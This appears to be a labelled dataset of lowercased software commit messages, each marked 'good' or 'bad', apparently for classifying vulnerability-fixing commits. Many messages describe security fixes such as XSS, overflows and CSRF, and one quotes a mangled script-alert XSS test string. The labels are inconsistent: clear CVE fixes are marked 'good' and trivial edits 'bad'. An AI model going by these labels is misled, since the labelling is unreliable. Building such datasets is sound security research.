"";"index";"all_text";"vuln"
"0";"5401";"fixed issue x reflection in cpdb and global setting";"bad"
"1";"6486";"fixed big x problem in open survey module";"bad"
"2";"8311";"removed openjdk6 from tested platform on travis travis openjdk6 and a compatible maven version is just too much trouble easier to move on";"good"
"3";"10043";"merge branch ia ssl doc fix into dev ia ssl doc fix added missing path validation error to documentation";"good"
"4";"8497";"better cleanup line coming from network thanks for jeriko one jeriko one gmx u for finding and reporting this";"good"
"5";"406";"test add target to build server main lib with limited list of extension 11737 signed off by yan avlasov yavlasov google com";"bad"
"6";"12109";"fix missing removal of undisclosedfields";"good"
"7";"7104";"delete lib_win php";"good"
"8";"8162";"merge use openstack common timeutils in simple db api";"good"
"9";"9897";"fix setting require_password_confirmation set to true by default";"good"
"10";"407";"fix a couple buffer overflow http hackerone com report 502816 http hackerone com report 507858 http github com videolan vlc blob master contrib src faad2 faad2 fix overflow patch";"bad"
"11";"1960";"don t let web skin name access file outside of usual skin directory thanks for jeriko one jeriko one gmx u for finding and reporting this";"bad"
"12";"3674";"sendmmsg sendmsg fix unsafe user pointer access dereferencing a user pointer directly from kernel space without going through the copy_from_user family of function is a bad idea two of such usage can be found in the sendmsg code path called from sendmmsg added by commit c71d8ebe7a4496fb7231151cb70a6baa0cb56f9a upstream commit 5b47b8038f183b44d2d8ff1c7d11a5c1be706b34 in the 3 0 stable tree usage are performed through memcmp and memcpy directly fix those by using the already copied msg_sys structure instead of the __user msg structure note that msg_sys can be set to null by verify_compat_iovec or verify_iovec which requires additional null pointer check signed off by mathieu desnoyers mathieu desnoyers efficios com signed off by david goulet dgoulet ev0ke net cc tetsuo handa penguin kernel i love sakura ne jp cc anton blanchard anton samba org cc david s miller davem davemloft net cc stable stable kernel org signed off by david s miller davem davemloft net";"bad"
"13";"6105";"fix x in adm_config_report php cve 2018 6403 nguyen tri tuan reported this vulnerability allowing an attacker to inject arbitrary code through a crafted value parameter prevent the attack by sanitizing the variable before output fix 23906";"bad"
"14";"10411";"cve 2017 13017 dhcpv6 add a missing option length check this fix a buffer over read discovered by bhargava shastry sect tu berlin add a test using the capture file supplied by the reporter s modified so the capture file won t be rejected a an invalid capture";"good"
"15";"3647";"apparmor fix oops in apparmor_setprocattr when invalid parameter are passed to apparmor_setprocattr a null deref oops occurs when it try to record an audit message this is because it is passing null for the profile parameter for aa_audit but aa_audit now requires that the profile passed is not null fix this by passing the current profile on the task that is trying to setprocattr signed off by kees cook kees ubuntu com signed off by john johansen john johansen canonical com cc stable kernel org signed off by james morris jmorris namei org";"bad"
"16";"9524";"fixed unit test to also include fileid in attachment";"good"
"17";"8530";"fix x in filter_form_draw_inputs cve 2018 13055 ömer çıtak security researcher at netsparker reported this vulnerability allowing remote attacker to inject arbitrary code if csp setting permit it through a crafted path_info on view_filters_page php prevent the attack by sanitizing the output of _server php_self before display fix 24580";"good"
"18";"1373";"prevent prototype pollution";"bad"
"19";"11945";"rt3662 allow leading in nameconstraints change by steveh from original by john denker in the rt reviewed by rich salz rsalz openssl org";"good"
"20";"5537";"disable flash uploading by default thanks to kacper szurek for reporting this";"bad"
"21";"8828";"add font to allowed_types";"good"
"22";"11801";"fix 5825";"good"
"23";"781";"fixed potential crash on pmt iod parse cf 1268 1269";"bad"
"24";"8313";"merge pull request 208 from pmuens patch 1 fix data accessing example in readme";"good"
"25";"6911";"fix test failure";"good"
"26";"531";"update contact_urls php";"bad"
"27";"4597";"src id3 c improve error handling";"bad"
"28";"7185";"hv implement wbinvd instruction emulation wbinvd is used to write back all modified cache line in the processor s internal cache to main memory and invalidates flush the internal cache using clflushopt instruction to emulate wbinvd to flush each guest vm memory if clflushopt is not supported boot will fail signed off by jack ren jack ren intel com signed off by yuan liu yuan1 liu intel com reviewed by li fei1 fei1 li intel com acked by eddie dong eddie dong intel com";"good"
"29";"5116";"fixed memory overrun bug in gdimagescaletwopass _gdcontributionscalc would compute a window size and then adjust the left and right position of the window to make a window within that size however it wa storing the value in the struct before it made the adjustment this change fix that";"bad"
"30";"8085";"don t allow report via api when disabled via web 661 check allow_reports setting in report api also fix php error when missing person params from api request";"good"
"31";"4046";"added some more protection against possible x attack";"bad"
"32";"6082";"bug encode choice option on render this pull request address potential x vulnerability due to unsanitized user input on field configuration";"bad"
"33";"12292";"4 2 7 release signed off by marc delisle marc infomarc info";"good"
"34";"7723";"xen netback require fewer guest rx slot when not using gso commit f48da8b14d04ca87ffcffe68829afd45f926ec6a xen netback fix unlimited guest rx internal queue and carrier flapping introduced a regression the pv frontend in ipxe only place 4 request on the guest rx ring since netback required at least max_skb_frags 1 slot ipxe could not receive any packet a if gso is not enabled on the vif fewer guest rx slot are required for the largest possible packet calculate the required slot based on the maximum gso size or the mtu this calculation of the number of required slot relies on 1650d5455bd2 xen netback always fully coalesce guest rx packet which present in 4 0 rc1 and later b reduce the rx stall detection to checking for at least one available rx request this is fine since we re predominately concerned with detecting interface which are down and thus have zero available rx request signed off by david vrabel david vrabel citrix com reviewed by wei liu wei liu2 citrix com signed off by david s miller davem davemloft net";"good"
"35";"4337";"kvm x86 introduce segmented_write_std introduces segemented_write_std switch from emulated read writes to standard read writes in fxsave fxrstor sgdt and sidt this fix cve 2017 2584 a longstanding kernel memory leak since commit 283c95d0e389 kvm x86 emulate fxsave and fxrstor 2016 11 09 which is luckily not yet in any final release this would also be an exploitable kernel memory write reported by dmitry vyukov dvyukov google com cc stable vger kernel org fix 96051572c819194c37a8367624b285be10297eca fix 283c95d0e3891b64087706b344a4b545d04a6e62 suggested by paolo bonzini pbonzini redhat com signed off by steve rutherford srutherford google com signed off by paolo bonzini pbonzini redhat com";"bad"
"36";"8601";"for 4 9 3 add test for print smb c print_trans this need to be squashed into the bug fix properly";"good"
"37";"6148";"fix 11246 x bug in category dropdown selector if a category name contains script alert 42 script then it would result in a x vulnerability whenever a category dropdown list wa printed this applies to page such a bug reporting updating a bug etc";"bad"
"38";"1488";"fix 14016 delete_attachments_threshold is not checked roland becker mantisbt developer reported the following security access control bug in a default installation delete_attachments_threshold is set to developer but having access level update_bug_threshold is enough to delete attachment if form_security_validation is set to off mantisbt wa not checking the access level of the user requesting deletion of an attachment to an issue against g_delete_attachments_threshold the new access control logic for deleting an issue attachment is now 1 doe the user have an access level of at least update_bug_threshold 2 if the user is the owner of the file and g_allow_delete_own_attachments off doe this user have an access level of at least delete_attachments_threshold 3 if the user is not the owner of the file do they have an access level of at least delete_attachments_threshold also refer to issue 14015 for discussion on whether update_bug_threshold should be part of the access control logic the relevant soap api call ha also been updated";"bad"
"39";"4774";"totemcrypto fix hmac key initialization signed off by fabio m di nitto fdinitto redhat com reviewed by jan friesse jfriesse redhat com";"bad"
"40";"12739";"module tag script manager 13 0 2 6 freepbx 20436 x vulnerability in manager module";"good"
"41";"7876";"handle object id 0 fix 99 this is cve 2017 9208 the qpdf library us object id 0 internally a a sentinel to represent a direct object but prior to this fix wa not blocking handling of 0 0 obj or 0 0 r a a special case creating an object in the file with 0 0 obj could cause various infinite loop the pdf spec doesn t allow for object 0 having qpdf handle object 0 might be a better fix but changing all the place in the code that assumes objid 0 mean direct would be risky";"good"
"42";"8388";"fuzz limit memory usage to prevent oom error";"good"
"43";"4931";"address a data bleeding issue with lift json";"bad"
"44";"5797";"fix phpmyadmin security 240 multiple csrf vulnerability signed off by madhura jayaratne madhura cj gmail com";"bad"
"45";"772";"prevent side channel leak in scala check_overflow";"bad"
